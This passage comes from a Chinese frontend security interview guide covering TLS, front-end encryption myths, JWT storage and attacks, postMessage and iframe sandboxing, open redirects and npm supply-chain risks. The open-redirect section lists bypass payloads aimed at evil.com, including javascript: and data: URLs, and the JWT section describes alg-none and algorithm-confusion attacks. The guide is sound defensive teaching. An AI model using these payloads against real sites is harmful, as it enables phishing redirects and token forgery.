**内网与元数据接口：** 浏览器可以访问 `localhost`、内网 IP、云厂商元数据地址。若这些接口响应 `Access-Control-Allow-Origin: *`，公网页面就能读取内网数据（跨站端口扫描、云元数据窃取）。内网服务应校验 `Origin` 或要求自定义头，不要默认开放 CORS。

**面试怎么答：** 先明确「CORS 是读取授权，不是鉴权」，再列最危险的三种配置：反射任意 Origin + 凭证、信任 `null`、子域正则过宽。补充 `Vary: Origin` 的缓存风险与内网接口暴露。最后强调「CORS 无法替代登录态校验与 CSRF 防御」。

**易错点：**

- 为了「兼容所有前端」直接反射 `Origin`，等于对所有站点开放。
- 把 `null` 加入白名单，忽略 sandbox iframe 也能产生 `null`。
- 用 `endsWith` 或未锚定的正则匹配域名，被相似域名绕过。
- 忘记 `Vary: Origin`，CDN 缓存导致跨用户数据串号。
- 认为 CORS 严格就能防 CSRF；表单请求根本不需要 CORS。
- 允许 `http://localhost` 上线到生产，留下明文来源。

## 8. HTTPS 与 TLS 握手、证书链、中间人攻击

**结论：** HTTPS 是 HTTP over TLS，解决的是**传输层的机密性、完整性、身份认证**：加密防窃听，MAC/AEAD 防篡改，证书链防冒充。它不防 XSS、CSRF、越权，也不保证服务端安全。理解 HTTPS 的关键是「握手协商密钥、证书验证身份、之后对称加密传输」这三步。

**TLS 1.2 与 1.3 握手对比：**

| 阶段 | TLS 1.2 | TLS 1.3 |
| --- | --- | --- |
| 往返次数 | 2-RTT | 1-RTT（会话恢复可 0-RTT） |
| ClientHello | 支持的套件、随机数、SNI | 支持的套件、随机数、SNI、`key_share` |
| ServerHello | 选定套件、随机数 | 选定套件、`key_share`，之后直接加密 |
| 证书 | 单独消息发送 | 与 ServerHello 后的加密消息一起 |
| 密钥交换 | `ServerKeyExchange` + `ClientKeyExchange` | 基于 (EC)DHE，ClientHello 就带上公钥份额 |
| 认证 | 证书 + `CertificateVerify` | 证书 + `CertificateVerify` |
| 对称加密 | 协商出的套件（如 AES-GCM） | 仅 AEAD 套件（如 AES-GCM、ChaCha20-Poly1305） |
| 前向保密 | 取决于套件 | 默认具备 |

```text
TLS 1.3（简化）
Client                                Server
  |---- ClientHello + key_share ------->|
  |<--- ServerHello + key_share --------|
  |<--- {EncryptedExtensions} ----------|
  |<--- {Certificate} ------------------|
  |<--- {CertificateVerify} ------------|
  |<--- {Finished} ---------------------|
  |---- {Finished} -------------------->|
  |<====== 对称加密的应用数据 ==========>|
```

**证书链：**

```text
叶子证书（example.com）
   ↑ 由中间 CA 签发
中间 CA（Intermediate CA）
   ↑ 由根 CA 签发
根 CA（Root CA，预装在系统/浏览器信任库）
```

| 校验项 | 内容 | 失败后果 |
| --- | --- | --- |
| 签名链 | 每一级证书由上一级私钥签名 | 链断裂，浏览器报错 |
| 有效期 | `Not Before` / `Not After` | 过期告警 |
| 域名 | SAN 中的 DNS 名称匹配访问域名 | 名称不匹配告警 |
| 用途 | `Extended Key Usage` 包含服务器认证 | 用途不符拒绝 |
| 吊销 | OCSP / CRL / OCSP Stapling | 证书被盗后仍可能被信任 |
| 透明日志 | Certificate Transparency | 未记录可能告警 |

根证书是信任的起点。操作系统与浏览器内置受信根列表，所以「证书链完整」不等于「可信」，还要看根是否在信任库、域名是否匹配、是否被吊销。

**中间人攻击（MITM）成立的条件：**

| 条件 | 说明 | 防御 |
| --- | --- | --- |
| 攻击者能拦截流量 | 公共 Wi-Fi、ARP 欺骗、DNS 劫持、恶意代理 | 使用 HTTPS，避免明文 |
| 能出示被信任的证书 | 伪造 CA、攻破 CA、用户安装恶意根证书、企业代理 | HSTS、证书固定、监控异常证书 |
| 用户忽略告警 | 点击「继续访问」 | 不提供绕过入口，HSTS 阻止降级 |

仅在 HTTP 下，攻击者可以直接篡改页面与注入脚本；在 HTTPS 下，如果没有可信证书，浏览器会阻断。企业代理之所以能解密，是因为它在员工设备上安装了受信任的根证书，这属于「合法但需管控」的 MITM。

**HSTS 与混合内容：**

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| 机制 | 作用 |
| --- | --- |
| `max-age` | 在该时间内强制 HTTPS，阻止降级 |
| `includeSubDomains` | 所有子域同样强制 HTTPS |
| `preload` | 申请加入浏览器内置 HSTS 列表，首次访问也强制 HTTPS |
| `upgrade-insecure-requests` | 把页面内 http 子资源升级为 https |
| `block-all-mixed-content` | 阻止混合内容加载 |

混合内容分两类：主动混合内容（脚本、CSS、iframe）通常被浏览器直接阻止；被动混合内容（图片、音频）可能被自动升级或告警。全站 HTTPS 后仍要检查硬编码的 `http://` 资源。

**部署检查清单：**

```text
1. 证书链完整，包含中间 CA，根证书受信
2. 证书域名覆盖所有访问域名（含 www 与裸域）
3. 启用 TLS 1.2+，禁用 TLS 1.0/1.1、RC4、3DES
4. 配置 HSTS，先短 max-age，再逐步加长并考虑 preload
5. 全站资源使用 HTTPS，消除混合内容
6. Cookie 加 Secure、HttpOnly、SameSite
7. 开启 OCSP Stapling，减少吊销检查延迟
8. 监控证书到期与 CT 日志异常
```

**面试怎么答：** 先给「机密性、完整性、身份认证」三个目标，再讲 TLS 1.3 的 1-RTT 握手与 TLS 1.2 的差异。证书部分讲清「叶子 → 中间 → 根」的链式信任与 SAN 校验。最后说明 MITM 的成立条件、HSTS 的作用，以及 HTTPS 不防 XSS/CSRF 的边界。

**易错点：**

- 认为部署了 HTTPS 就安全；它只保护传输层。
- 证书只配裸域，忽略 `www` 子域，导致部分访问告警。
- 证书链缺少中间证书，部分客户端能通、部分报错。
- 认为 HSTS 能立即生效；首次访问仍可能走 HTTP，`preload` 才能覆盖首次。
- 忽略混合内容，页面里的 `http://` 脚本被拦截或降级。
- 认为证书固定（pinning）是万能方案；证书轮换时会导致大规模不可用。

## 9. 前端加密的误区（密码传输、前端加密是否有意义）

**结论：** 前端加密**不能替代 HTTPS**，也不能解决「客户端不可信」这个根本问题。绝大多数「登录页用 RSA/AES 加密密码」的方案只是安全表演：密钥必须下发到前端，攻击者同样能拿到；加密后的密文如果可重放，仍然能被登录。真正有意义的前端加密只有两类：**端到端加密（服务端拿不到明文）**与**PAKE 类协议（不传输密码等价物）**。

**常见误区：**

| 做法 | 为什么没用 |
| --- | --- |
| 前端 `MD5`/`SHA-256` 哈希密码后传输 | 哈希值变成了「密码等价物」，库泄露后可直接重放；服务端无法再做慢哈希 |
| 前端 AES 加密，密钥硬编码在 JS | 密钥随代码下发，攻击者可直接解密 |
| 用固定 RSA 公钥加密密码 | 公钥可被替换（无 TLS 时），且密文可重放 |
| Base64 / 自定义编码 | 只是编码，不是加密 |
| 代码混淆 | 提高阅读成本，不提供机密性 |
| 把密码拆成多段传输 | 攻击者仍能拿到完整等价物 |

**前端哈希的致命问题：**

```js
// 错误示范：把哈希后的值当作密码传输
const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(password));
const payload = { username, passwordHash: toHex(hash) };
await fetch('/login', { method: 'POST', body: JSON.stringify(payload) });
```

一旦服务端只校验 `passwordHash`，这个哈希值就**等价于密码**：数据库泄露后攻击者可以直接用它登录，不需要破解；服务端也无法再用 bcrypt/Argon2 做慢哈希与盐值保护。正确做法是让密码原文经 TLS 传输，服务端用 Argon2id/bcrypt 加盐哈希存储。

**那前端加密什么时候有意义：**

| 场景 | 是否有意义 | 原因 |
| --- | --- | --- |
| 登录密码传输 | 基本无意义 | HTTPS 已提供传输机密性，前端加密不防重放 |
| 端到端加密聊天 | 有意义 | 密钥只在客户端，服务端无法解密 |
| 用户本地数据加密后上传 | 有意义 | 密钥由用户口令派生，服务端只存密文 |
| 支付卡号直接传给支付网关 | 有意义但通常用网关 SDK | 避免卡号经过自有服务端，降低 PCI 范围 |
| PAKE（SRP/OPAQUE） | 有意义 | 不传输密码等价物，抵抗服务端泄露 |
| 防止「抓包看明文」 | 无意义 | 有 TLS 就够；没有 TLS，前端加密也能被替换脚本 |

**一个真正的端到端加密示例：**

```js
// 用口令派生密钥，加密后再上传；服务端只保存密文与盐
async function deriveKey(passphrase, salt) {
  const baseKey = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(passphrase),
    'PBKDF2',
    false,
    ['deriveKey']
  );
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, iterations: 310000, hash: 'SHA-256' },
    baseKey,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}

async function encryptNote(passphrase, plaintext) {
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const key = await deriveKey(passphrase, salt);
  const cipher = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    new TextEncoder().encode(plaintext)
  );
  return { salt: toBase64(salt), iv: toBase64(iv), cipher: toBase64(cipher) };
}
```

注意：即使是 E2EE，前端代码本身也可能被篡改（供应链、XSS），所以仍需要 SRI、CSP 与代码完整性校验。密钥管理、口令强度、设备安全仍是难点。

**密码学的正确用法：**

| 目标 | 正确方案 |
| --- | --- |
| 传输机密性 | HTTPS（TLS 1.2+） |
| 密码存储 | 服务端 Argon2id / bcrypt / scrypt + 随机盐 |
| 会话凭证 | 随机 Token + HttpOnly Cookie 或安全存储 |
| 数据完整性 | AEAD（AES-GCM、ChaCha20-Poly1305）或 HMAC |
| 端到端加密 | 客户端生成密钥，服务端只转发密文 |
| 口令认证不传等价物 | OPAQUE / SRP |

**面试怎么答：** 先给结论「前端加密不替代 HTTPS，默认不可信」，再解释前端哈希为什么会把哈希变成密码等价物。然后区分「安全表演」与「真正有意义」的场景：E2EE、PAKE、本地数据加密。最后补密码存储应用 Argon2/bcrypt、前端代码本身也可能被篡改。

**易错点：**

- 认为前端加密后就可以用 HTTP 传输；攻击者可以替换页面脚本。
- 前端哈希后服务端直接存哈希，等于把弱哈希当密码用。
- 把密钥硬编码在 JS 或环境变量里，仍会打包进产物。
- 认为 Base64、混淆、自定义编码属于加密。
- 忽略重放攻击；固定密文可以被重复提交。
- 做 E2EE 却把密钥上传到服务端，等于没有端到端。

## 10. JWT 与登录态存储（Cookie vs localStorage 的安全权衡）

**结论：** JWT 是**自包含的签名令牌**，服务端无需查库即可校验，但**无法主动撤销**是它的先天缺陷。存储位置没有「绝对安全」的选项：`localStorage` 易被 XSS 读取，Cookie 易受 CSRF 但可 `HttpOnly`，内存最安全但刷新即丢。工程上常用「HttpOnly Cookie 存 Refresh Token + 内存存短命 Access Token」，或直接用 BFF 模式把令牌留在服务端。

**JWT 结构：**

```text
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjMiLCJleHAiOjE3MzAwMDAwMDAsInJvbGUiOiJ1c2VyIn0
.
signature
```

| 部分 | 内容 | 注意 |
| --- | --- | --- |
| Header | `alg`、`typ`、`kid` | `alg` 不能由客户端决定信任 |
| Payload | `sub`、`exp`、`iat`、`iss`、`aud`、自定义 claim | 只是 Base64URL 编码，**不是加密** |
| Signature | 对前两部分的签名 | 校验必须限定算法与密钥 |

**常见 claim：**

| claim | 含义 | 校验要点 |
| --- | --- | --- |
| `exp` | 过期时间 | 必须校验，且服务端时间要准 |
| `iat` | 签发时间 | 可用于拒绝未来签发的令牌 |
| `nbf` | 生效时间 | 可选 |
| `iss` | 签发者 | 必须匹配预期 |
| `aud` | 受众 | 必须匹配当前服务 |
| `sub` | 主体 | 用户 ID，不要放敏感信息 |
| `jti` | 令牌唯一 ID | 用于黑名单/重放控制 |

**存储位置对比：**

| 位置 | XSS 风险 | CSRF 风险 | 持久性 | 跨标签页 | 说明 |
| --- | --- | --- | --- | --- | --- |
| `localStorage` | 高（JS 可读） | 无（不会自动发送） | 是 | 是 | 最方便，也最容易被盗 |
| `sessionStorage` | 高 | 无 | 标签页内 | 否 | 略好于 localStorage，但仍可被读 |
| `HttpOnly` Cookie | 低（JS 不可读） | 高（自动携带） | 可设置 | 是 | 必须配 SameSite + CSRF Token |
| 内存变量 | 低（刷新即丢） | 无 | 否 | 否 | 最安全，但需要刷新令牌 |
| URL 参数 | 高（日志/Referer 泄露） | 无 | 否 | 是 | 不应使用 |
| Service Worker | 中 | 中 | 是 | 是 | 实现复杂，SW 可被终止 |

**推荐架构：**

```text
浏览器
  ├─ Access Token：内存，15 分钟内过期，放 Authorization 头
  └─ Refresh Token：HttpOnly + Secure + SameSite=Lax Cookie，Path=/auth/refresh
服务端
  ├─ /auth/refresh 校验 Refresh Token，旋转发新
  └─ 业务接口只校验 Access Token 的签名、exp、aud、iss
```

这样 XSS 拿不到 Refresh Token，CSRF 打不到只读 Cookie 的接口（且刷新接口可用 SameSite + 自定义头保护），Access Token 短期失效降低泄露窗口。

**常见 JWT 攻击：**

| 攻击 | 原理 | 防御 |
| --- | --- | --- |
| `alg: none` | 服务端信任 header 里的算法，跳过验签 | 固定算法白名单，拒绝 `none` |
| 算法混淆 | 用公钥当 HMAC 密钥，RS256 骗成 HS256 | 明确指定算法，不混用密钥类型 |
| 弱密钥 | HS256 密钥可被爆破 | 使用 256 位以上随机密钥 |
| `kid` 注入 | `kid` 拼进文件路径或 SQL | 不信任 `kid`，用映射表 |
| `jku`/`x5u` 伪造 | 指向攻击者 JWKS | 不信任外部 URL，固定密钥源 |
| 无 `exp`/`aud` 校验 | 令牌永久有效或跨服务复用 | 强制校验 `exp`、`aud`、`iss` |
| 令牌放 URL | 被日志、Referer、截图泄露 | 只放 Authorization 头 |
| 无法撤销 | 签发后直到过期都有效 | 短过期 + `jti` 黑名单 + 刷新旋转 |

```js
// 校验示例：必须显式指定算法与受众
import jwt from 'jsonwebtoken';

function verifyAccessToken(token) {
  return jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256'],
    audience: 'api.example.com',
    issuer: 'auth.example.com',
    clockTolerance: 5,
  });
}
```

**撤销与刷新：**

| 方案 | 说明 | 代价 |
| --- | --- | --- |
| 短过期 Access Token | 15 分钟内自然失效 | 需要刷新机制 |
| Refresh Token 旋转 | 每次刷新换新，旧的立即失效 | 需要存储与重放检测 |
| `jti` 黑名单 | 记录已撤销的令牌 ID | 需要查存储，失去「无状态」优势 |
| 令牌版本号 | 用户表存 `tokenVersion`，改密码后自增 | 每次请求需查用户 |
| BFF 模式 | 令牌只存在服务端 Session，浏览器只有 Session Cookie | 需要服务端会话存储 |

**JWT 不适合什么：**

- 需要**即时撤销**的权限系统（如后台封禁、强制下线）。
- 存放大量用户信息（体积大、每次请求都带、易泄露）。
- 存放敏感数据（payload 只是编码，任何人都能解码）。
- 作为服务端 Session 的简单替代（没有撤销与续期设计时会很痛）。

**面试怎么答：** 先讲 JWT 的三段结构与「签名不等于加密」，再对比 localStorage/Cookie/内存的 XSS 与 CSRF 权衡，给出「内存 Access + HttpOnly Refresh」或 BFF 的推荐架构。最后补 `alg: none`、算法混淆、无法撤销三个关键问题，说明短过期 + 旋转 + 黑名单的取舍。

**易错点：**

- 认为 JWT 是加密的；payload 只是 Base64URL，任何人可解码。
- 把 JWT 放 localStorage 图方便，忽略 XSS 可直接读取。
- 用 Cookie 存 JWT 却不加 `SameSite` 与 CSRF Token，暴露在 CSRF 下。
- 校验时信任 header 的 `alg`，导致 `none` 或算法混淆攻击。
- 设置很长过期时间，又没有撤销机制，账号被盗后长期有效。
- 把 Refresh Token 也放 localStorage，等于把长期凭证交给 XSS。

## 11. postMessage 与 iframe 的安全（targetOrigin、sandbox）

**结论：** `postMessage` 是跨源页面之间**唯一的标准通信方式**，但它是「显式授权」而不是「安全隔离」：发送方要指定 `targetOrigin`，接收方必须校验 `event.origin`、`event.source` 与消息结构。iframe 的安全则依赖 `sandbox`、`allow` 与响应头（`X-Frame-Options`/`frame-ancestors`），任何一项缺失都可能造成数据泄露或脚本逃逸。

**发送方：targetOrigin 必须精确**

```js
// 错误：任意源都能收到，iframe 被导航后消息直接泄露
iframe.contentWindow.postMessage({ token }, '*');

// 正确：只发给指定源
iframe.contentWindow.postMessage({ type: 'init' }, 'https://child.example.com');
```

`targetOrigin` 匹配的是**发送瞬间目标窗口的源**。如果无法确定目标源，宁可先通过安全通道协商，也不要用 `"*"` 传敏感数据。

**接收方：三件事都要校验**

```js
const ALLOWED_ORIGINS = new Set(['https://parent.example.com']);

window.addEventListener('message', (event) => {
  if (!ALLOWED_ORIGINS.has(event.origin)) return;
  if (event.source !== window.parent) return;
  if (typeof event.data !== 'object' || event.data === null) return;

  const { type, payload } = event.data;
  if (type === 'set-theme' && typeof payload?.theme === 'string') {
    document.documentElement.dataset.theme = payload.theme;
  }
});
```

| 校验项 | 目的 | 常见错误 |
| --- | --- | --- |
| `event.origin` | 确认发送方源 | 用 `includes`/`startsWith` 匹配，被相似域名绕过 |
| `event.source` | 确认是预期的窗口 | 不校验，同源其他窗口可伪造 |
| 消息结构 | 防止类型混淆、原型污染 | 直接把 `event.data` 合并进全局对象 |
| 消息通道 | 隔离不同业务 | 所有消息共用一个 `message` 监听器 |

**不要信任 `event.origin` 为 `null`：** sandbox iframe、`data:` 页面、部分重定向会得到 `null`。如果白名单包含 `null`，等于向所有这类上下文开放。

**sandbox 的安全组合：**

| 组合 | 安全性 | 说明 |
| --- | --- | --- |
| 无属性 | 最高 | 无脚本、唯一源、不能提交表单 |
| `allow-scripts` | 较高 | 有脚本但仍是唯一源，无法读父页存储 |
| `allow-scripts allow-same-origin` | 低 | 脚本可移除 sandbox，等于没隔离 |
| `allow-scripts allow-forms` | 中 | 可提交表单，注意 CSRF |
| `allow-scripts allow-top-navigation` | 低 | 可劫持顶层页面 |
| `allow-popups` + `allow-scripts` | 中 | 弹窗可能被用于钓鱼 |

```html
<!-- 第三方内容：只给脚本能力，不给同源能力 -->
<iframe
  src="https://widget.example.com"
  sandbox="allow-scripts allow-forms"
  referrerpolicy="no-referrer"
  loading="lazy"
></iframe>
```

如果第三方内容确实需要访问自己的 Cookie/存储，应让它独立部署在自己的源，而不是给它 `allow-same-origin` 后嵌进主站。

**iframe 的其他安全属性：**

| 属性/头 | 作用 |
| --- | --- |
| `allow` | 控制摄像头、麦克风、地理位置等权限，默认拒绝 |
| `referrerpolicy` | 控制 Referer 泄露 |
| `csp` | 限制 iframe 内可加载的资源 |
| `X-Frame-Options` | 目标页面拒绝被嵌入 |
| `frame-ancestors` | CSP 版本的嵌入白名单 |
| `credentialless` | 无凭证加载跨源 iframe（部分浏览器） |

**微前端场景的额外风险：** 多个子应用共享同一个源时，`postMessage` 无法区分「同源但不可信」的子应用；子应用可以读写主应用的 localStorage、Cookie 与 DOM。此时应按子应用划分源，或使用 `Shadow DOM` + 严格的消息协议 + 权限校验，而不是假设「同源即可信」。

**面试怎么答：** 先讲 `postMessage` 的「显式授权」定位，再给发送方 `targetOrigin` 与接收方三校验（origin、source、结构）。iframe 部分讲 `sandbox` 的组合风险，尤其是 `allow-scripts + allow-same-origin` 等于没隔离。最后补 `allow` 权限、嵌入响应头、微前端同源风险。

**易错点：**

- 发送用 `"*"` 传 token，iframe 一旦被导航就泄露。
- 接收只校验消息类型，不校验 `origin` 与 `source`。
- 把 `null` 加入来源白名单，忽略 sandbox 页面也能发消息。
- 给第三方 iframe 同时开 `allow-scripts` 与 `allow-same-origin`。
- 认为同源 iframe 一定可信；同源子应用仍可能被 XSS 或供应链污染。
- 忘记 iframe 的 `allow` 默认拒绝，导致功能不可用后随意放开全部权限。

## 12. 开放重定向、URL 跳转与参数篡改

**结论：** 开放重定向是**把用户可控的 URL 直接用于跳转**，攻击者借此把用户从可信域名带到钓鱼站，或绕过 CSP/OAuth 的白名单。它本身不直接窃取数据，但常被用作钓鱼链条与 XSS/CSP 绕过的跳板。防御的核心是**不信任任何跳转参数**：只允许站内相对路径，或维护精确的目标白名单。

**常见入口：**

```text
/login?redirect=https://app.example.com/home
/auth/callback?returnUrl=/orders
/out?url=https://partner.example.com
/sso?next=...
```

**常见绕过手法：**

| 输入 | 绕过原理 |
| --- | --- |
| `//evil.com` | 协议相对 URL，浏览器按当前协议跳转 |
| `https://app.example.com.evil.com` | 前缀看起来合法，实际主机是 `evil.com` |
| `https://app.example.com@evil.com` | `@` 前是用户信息，真实主机是 `evil.com` |
| `https://evil.com\@app.example.com` | 反斜杠在部分解析器中被当作斜杠 |
| `%2f%2fevil.com` | 双重编码后解码成 `//evil.com` |
| `https:evil.com` | 省略斜杠的写法，仍会跳到 `evil.com` |
| `/redirect?url=https://evil.com` | 多级跳转，最终仍到外站 |
| `javascript:alert(1)` | 直接执行脚本 |
| `data:text/html,...` | 打开可执行页面 |
| `#@evil.com` | 片段处理不当，被前端拼接后改变主机 |

**危险写法与安全写法：**

```js
// 危险：直接赋值
const next = new URLSearchParams(location.search).get('next');
location.href = next;
```

```js
// 安全：只允许站内相对路径
function safeRedirect(target, fallback = '/') {
  if (!target) return fallback;
  try {
    const url = new URL(target, window.location.origin);

    // 只允许 http/https，且必须是当前站点
    if (url.protocol !== 'https:' && url.protocol !== 'http:') return fallback;
    if (url.origin !== window.location.origin) return fallback;

    return url.pathname + url.search + url.hash;
  } catch {
    return fallback;
  }
}

location.href = safeRedirect(new URLSearchParams(location.search).get('next'));
```

如果业务确实需要跳到外部合作方，必须使用**精确主机白名单**，并在跳转前展示确认页，避免被当作钓鱼跳板：

```js
const TRUSTED_HOSTS = new Set(['partner.example.com', 'pay.example.com']);

function safeExternalRedirect(target) {
  const url = new URL(target, window.location.origin);
  if (url.protocol !== 'https:') throw new Error('only https');
  if (!TRUSTED_HOSTS.has(url.hostname)) throw new Error('host not allowed');
  return url.toString();
}
```

**OAuth 的 redirect_uri：** 授权服务器必须对 `redirect_uri` 做**精确匹配**（协议、主机、端口、路径全部一致），不能使用通配符或前缀匹配。否则攻击者可以把授权码送到自己的域名。配合 `state` 防 CSRF、PKCE 防拦截，公网客户端不要使用隐式流程。

**参数篡改：** 除了跳转，URL 中的 `price`、`role`、`userId`、`tenantId` 等参数也不能信任。前端计算的价格、权限、租户隔离必须在服务端重新校验。常见错误是把 `isAdmin=true` 放在前端路由守卫里判断，攻击者改参数或直接调接口即可绕过。

**tabnabbing：** 通过 `target="_blank"` 打开外链时，新页面可以通过 `window.opener` 把原页面导航到钓鱼站。

```html
<!-- 正确：切断 opener 并限制 Referer -->
<a href="https://external.example.com" target="_blank" rel="noopener noreferrer">外链</a>
```

```js
// 动态打开时同样要处理
const win = window.open('https://external.example.com', '_blank', 'noopener,noreferrer');
```

**面试怎么答：** 先说明开放重定向的危害不是「直接泄露数据」，而是钓鱼与绕过白名单。再列常见绕过（`//`、`@`、反斜杠、编码、多级跳转），强调「用 URL 解析器 + 精确 origin 白名单」而不是字符串前缀判断。最后补 OAuth 精确匹配与 tabnabbing。

**易错点：**

- 用 `startsWith('/')` 判断站内跳转，`//evil.com` 直接绕过。
- 用 `includes('example.com')` 判断主机，被 `example.com.evil.com` 绕过。
- 只检查一次编码，忽略双重编码。
- OAuth `redirect_uri` 用通配符或前缀匹配，授权码可被劫持。
- 允许 `javascript:` 或 `data:` 协议跳转。
- 外链不加 `rel="noopener"`，被新页面通过 `window.opener` 反向导航。

## 13. 第三方脚本与供应链安全（SRI、npm 投毒、敏感信息泄露、sourcemap）

**结论：** 前端供应链的安全边界比后端更模糊：CDN 脚本、npm 依赖、构建工具、统计 SDK、客服插件都以**同源权限**运行，一旦被投毒就能读取页面全部数据、篡改交易、窃取凭证。防御需要从「依赖引入、构建产物、运行时隔离、泄露面」四个环节同时下手，单靠代码审查不够。

**攻击面：**

| 环节 | 风险 | 典型事件 |
| --- | --- | --- |
| CDN 脚本 | 文件被替换、域名被劫持 | 第三方 JS 被植入窃取逻辑 |
| npm 依赖 | 投毒、抢注、维护者账号被盗 | 恶意包窃取环境变量与 Token |
| 构建工具链 | 插件执行任意代码 | 构建期读取密钥并外传 |
| 第三方 SDK | 权限过大、收集过多数据 | 客服/统计脚本读取表单内容 |
| 构建产物 | sourcemap、环境变量、注释泄露 | 源码与内网地址暴露 |
| 部署与 CI | 令牌泄露、制品被替换 | 发布流程被植入后门 |

**SRI（Subresource Integrity）：**

```html
<script
  src="https://cdn.example.com/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

| 要点 | 说明 |
| --- | --- |
| 算法 | `sha256`、`sha384`、`sha512`，推荐 384 以上 |
| 跨域 | 必须加 `crossorigin="anonymous"`，否则无法校验 |
| 覆盖范围 | 只校验被标记的资源，不保护动态插入的脚本 |
| 更新成本 | 资源内容变就必须更新 hash，适合固定版本 |
| 局限 | 同源脚本、内联脚本、被篡改的 HTML 本身不受保护 |

SRI 解决的是「CDN 上的文件被替换」，不解决「依赖本身有恶意代码」。因此还需要锁定版本、审计依赖、限制第三方权限。

**npm 供应链攻击类型：**

| 类型 | 手法 | 防御 |
| --- | --- | --- |
| 抢注/仿冒 | 包名与流行包相似（`lodash` vs `lodesh`） | 人工核对包名与仓库地址 |
| 依赖混淆 | 内网私有包名被发布到公共源 | 配置 scope registry，禁止公共源覆盖私有 scope |
| 维护者账号被盗 | 攻击者发布新版本 | 锁定 lockfile、审阅升级 diff、使用 provenance |
| 安装脚本 | `preinstall`/`postinstall` 执行任意命令 | `ignore-scripts`、白名单、容器内构建 |
| 废弃包接管 | 原作者转让包名 | 监控依赖维护状态 |
| 恶意升级 | 小版本里植入窃取逻辑 | 固定版本、`npm ci`、审计 |
| 构建插件 | 构建期读取密钥 | CI 最小权限、密钥只在运行时注入 |

```json
{
  "scripts": {
    "preinstall": "node ./scripts/check.js"
  }
}
```

上面的 `preinstall` 会在安装时自动执行，攻击者可以在这里读取 `process.env`、`~/.npmrc` 并上传。构建环境应尽量使用 `--ignore-scripts`，或把安装步骤放进无密钥的隔离容器。

**依赖治理清单：**

```text
1. 提交 lockfile，CI 使用 npm ci / pnpm install --frozen-lockfile
2. 固定版本，避免自动升级到不可信的新版本
3. 私有 scope 配置独立 registry，防止依赖混淆
4. 开启 2FA、使用 provenance/签名验证
5. 定期 npm audit / osv-scanner，关注高危与废弃包
6. 构建容器不挂载生产密钥，安装脚本默认禁用
7. 审阅新增依赖的仓库、维护者、下载量与发布时间
8. 生成 SBOM，记录依赖版本与来源
```

**敏感信息泄露：**

| 泄露点 | 说明 |
| --- | --- |
| 环境变量 | `process.env.API_KEY` 被构建工具替换进 bundle |
| sourcemap | `.map` 文件公开可访问，还原完整源码与注释 |
| 注释与调试代码 | 内网地址、测试账号、TODO 中的密钥 |
| 错误上报 | 把请求头、Cookie、Token 一起上报 |
| 日志 | 前端 `console.log` 打印完整用户对象 |
| 接口响应 | 返回多余字段（手机号、内部 ID、权限位） |

前端**没有秘密**：任何打包进产物的字符串都可能被读取。密钥、数据库连接、管理接口凭证必须留在服务端；前端只放公开配置（如地图 key、支付公钥），并配合域名/来源限制。

**sourcemap 的处理：**

```js
// vite.config.js：生产不生成公开 sourcemap，另传监控平台
export default {
  build: {
    sourcemap: 'hidden', // 生成但不写 sourceMappingURL
  },
};
```

| 方案 | 说明 |
| --- | --- |
| `sourcemap: false` | 完全不生成，排查困难 |
| `sourcemap: true` | 生成并公开引用，源码泄露 |
| `sourcemap: 'hidden'` | 生成但不引用，需手动上传监控平台 |
| 访问控制 | 把 `.map` 放在内网或需鉴权的路径 |

即使使用 `hidden`，如果 `.map` 文件被部署到公网目录且可被猜到，仍可能泄露；应确保产物目录不包含 map，或由监控平台单独保管。

**第三方脚本的隔离：**

| 手段 | 作用 |
| --- | --- |
| CSP | 限制可加载的脚本源，配合 nonce |
| SRI | 固定 CDN 文件内容 |
| iframe + sandbox | 把第三方 UI 放进独立源，禁止访问主站 DOM |
| Web Worker | 让第三方计算代码无法访问 DOM |
| 权限最小化 | 不给摄像头、剪贴板、地理位置等权限 |
| 加载时机 | 延迟加载、用户同意后再加载 |
| 监控 | CSP 报告、异常外联、性能与错误监控 |

统计、客服、A/B 测试类脚本最容易获得过大权限。能用 iframe 沙箱就不要直接内联；能自建就不要引入来源不明的 SDK。

**面试怎么答：** 按「CDN、npm、构建、产物、第三方运行时」五个环节讲风险，再给对应防御：SRI + CSP、lockfile + 私有 registry + `ignore-scripts`、CI 最小权限、sourcemap 与密钥治理、iframe/Worker 隔离。重点强调「前端没有秘密」与「第三方脚本拥有同源权限」。

**易错点：**

- 加了 SRI 却忘记 `crossorigin`，跨域脚本校验直接失败。
- 认为 SRI 能防依赖包本身的恶意代码；它只校验文件内容。
- 提交了 lockfile 但 CI 仍用 `npm install`，版本可能被解析到新版本。
- 把 `API_KEY` 放进 `VITE_`/`NEXT_PUBLIC_` 变量，等于公开。
- 生产环境公开 `.map`，源码与内网信息全部泄露。
- 直接内联第三方脚本，给它同源权限，出问题时可以读取任意页面数据。
